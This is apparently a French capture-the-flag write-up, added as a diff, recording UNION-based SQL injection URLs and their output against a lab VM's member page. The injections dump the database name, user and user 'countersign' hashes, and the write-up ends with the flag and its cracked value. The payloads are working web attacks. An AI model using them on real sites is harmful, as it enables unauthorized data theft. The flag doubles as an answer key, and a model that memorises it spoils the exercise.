@@ -1,0 +1,84 @@
+Sources:
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+https://dev.mysql.com/doc/refman/8.0/en/st-geometry-columns-table.html
+
+En testant 1 OR 1=1; on se rend compte qu'une injection est possible. 
+Petit a petit, on test jusqu'a trouver ce aue l'on souhaite
+
+Result:
+
+http://192.168.56.103/index.php?page=member&id=1%20AND%200%20UNION%20SELECT%20@@version,%20database()%20%20;&Submit=Submit#
+
+ID: 1 AND 0 UNION SELECT @@version, database()  ; 
+First name: 5.5.44-0ubuntu0.12.04.1
+Surname : Member_Sql_Injection
+
+http://192.168.56.103/index.php?page=member&id=1%20AND%200%20UNION%20SELECT%20@@version,%20current_user()%20%20;&Submit=Submit#
+
+ID: 1 AND 0 UNION SELECT @@version, current_user()  ; 
+First name: 5.5.44-0ubuntu0.12.04.1
+Surname : borntosec@localhost
+
+http://192.168.56.103/index.php?page=member&id=1000%20AND%200%20UNION%20SELECT(SELECT%20GROUP_CONCAT(first_name)%20from%20Member_Sql_Injection.users),%20database()%20%20;&Submit=Submit#
+
+ID: 1000 AND 0 UNION SELECT(SELECT GROUP_CONCAT(first_name) from Member_Sql_Injection.users), database()  ; 
+First name: Barack Hussein,Adolf,Joseph,Flag
+Surname : Member_Sql_Injection
+
+http://192.168.56.103/index.php?page=member&id=1000%20AND%200%20UNION%20SELECT(SELECT%20GROUP_CONCAT(last_name)%20from%20Member_Sql_Injection.users),%20database()%20%20;&Submit=Submit#
+
+ID: 1000 AND 0 UNION SELECT(SELECT GROUP_CONCAT(first_name) from Member_Sql_Injection.users), database()  ; 
+First name: Barack Hussein,Adolf,Joseph,Flag
+Surname : Member_Sql_Injection
+
+http://192.168.56.103/index.php?page=member&id=1%20AND%200%20UNION%20SELECT(SELECT%20GROUP_CONCAT(last_name,%20first_name)%20FROM%20Member_Sql_Injection.users),%20database()%20%20;&Submit=Submit#
+
+ID: 1 AND 0 UNION SELECT(SELECT GROUP_CONCAT(last_name, first_name) FROM Member_Sql_Injection.users), database()  ; 
+First name: ObamaBarack Hussein,HitlerAdolf,StalineJoseph,GetTheFlag
+Surname : Member_Sql_Injection
+
+http://192.168.56.103/index.php?page=member&id=1%20AND%200%20UNION%20SELECT(SELECT%20GROUP_CONCAT(%20information_schema.columns)%20from%20information.Member_Sql_Injection),%20database()%20%20;&Submit=Submit#
+
+--->SELECT command denied to user 'borntosec'@'localhost' for table 'Member_Sql_Injection'
+
+http://192.168.56.103/index.php?page=member&id=1%20AND%200%20UNION%20SELECT%20(SELECT%20GROUP_CONCAT%20(0)%20FROM%20Member_Sql_Injection.users)%20%20FROM%20Member_Sql_Injection.users%20WHERE%20length(first_name)%20=%204;&Submit=Submit#
+
+--->FUNCTION Member_Sql_Injection.GROUP_CONCAT does not exist. Check the 'Function Name Parsing and Resolution' section in the Reference Manual
+
+http://192.168.56.103/index.php?page=member&id=1%20AND%200%20UNION%20SELECT%20TABLE_NAME,%20%20TABLE_ROWS%20FROM%20information_schema.tables;&Submit=Submit#
+
+...
+
+http://192.168.56.103/index.php?page=member&id=1%20AND%200%20UNION%20SELECT%20TABLE_NAME,%20%20TABLE_NAME%20FROM%20users.columns;&Submit=Submit#
+
+SELECT command denied to user 'borntosec'@'localhost' for table 'columns'
+
+http://192.168.56.103/index.php?page=member&id=1%20AND%200%20UNION%20SELECT%20(SELECT%20*%20FROM%20users)%20FROM%20Member_Sql_Injection.users,%20(SELECT%20last_name%20FROM%20user);&Submit=Submit#
+
+Every derived table must have its own alias
+
+http://192.168.56.103/index.php?page=member&id=1%20AND%200%20UNION%20SELECT%20last_name,%20first_name%20FROM%20users;&Submit=Submit#
+
+...
+
+http://192.168.56.103/index.php?page=member&id=1%20AND%200%20UNION%20SELECT%20table_name,%20column_name%20FROM%20information_schema.columns%20;&Submit=Submit#
+
+...
+
+http://192.168.56.103/index.php?page=member&id=1%20AND%200%20UNION%20SELECT%20(SELECT%20GROUP_CONCAT(user_id,%20town,%20country,%20planet,%20%20last_name,%20first_name,%20%20countersign)%20FROM%20Member_Sql_Injection.users%20WHERE%20user_id%20=%205)%20,%20%20database()%20%20;&Submit=Submit#
+
+
+ID: 1 AND 0 UNION SELECT (SELECT GROUP_CONCAT(user_id, town, country, planet,  last_name, first_name,  countersign) FROM Member_Sql_Injection.users WHERE user_id = 5) ,  database()  ; 
+First name: 5424242GetTheFlag5ff9d0165b4f92b14994e5c685cdce28
+Surname : Member_Sql_Injection
+
+http://192.168.56.103/index.php?page=member&id=1%20AND%200%20UNION%20SELECT%20(SELECT%20GROUP_CONCAT(countersign)%20FROM%20users)%20,%20%20database()%20%20;&Submit=Submit#
+
+ID: 1 AND 0 UNION SELECT (SELECT GROUP_CONCAT(countersign) FROM users) ,  database()  ; 
+First name: 2b3366bcfd44f540e630d4dc2b9b06d9,60e9032c586fb422e2c16dee6286cf10,e083b24a01c483437bcf4a9eea7c1b4d,5ff9d0165b4f92b14994e5c685cdce28
+Surname : Member_Sql_Injection
+
+
+flag : 5ff9d0165b4f92b14994e5c685cdce28
+5ff9d0165b4f92b14994e5c685cdce28 : FortyTwo
+
